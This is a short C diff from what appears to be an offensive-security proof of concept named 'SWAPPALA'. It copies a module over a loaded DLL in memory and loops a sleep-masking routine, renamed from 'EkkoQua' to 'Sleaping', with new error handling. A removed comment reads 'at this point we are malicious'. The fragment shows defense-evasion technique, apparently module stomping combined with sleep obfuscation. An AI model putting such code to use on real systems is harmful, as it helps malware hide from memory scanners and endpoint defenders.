@@ -85,13 +85,15 @@ int main()
         
     }
     memcpy(SRHMODULE, SWAPPALA, sizeof(SWAPPALA));
-    //at this point we are malicious
-    //getchar();
+    
 
     //hide and seek 
     do {
 
-        EkkoQua(SRHMODULE, SRHHANDLE, MALHANDLE, SRHSIZE);
+		if (Sleaping(SRHMODULE, SRHHANDLE, MALHANDLE, SRHSIZE) == -1) {
+			printf("[-] Error while swapping DLLs\n");
+			return -1;
+		}
         MessageBoxA(NULL, "Check Memory Drago!", "SWAPPALA", MB_OK | MB_ICONINFORMATION);
         
     } while (TRUE);
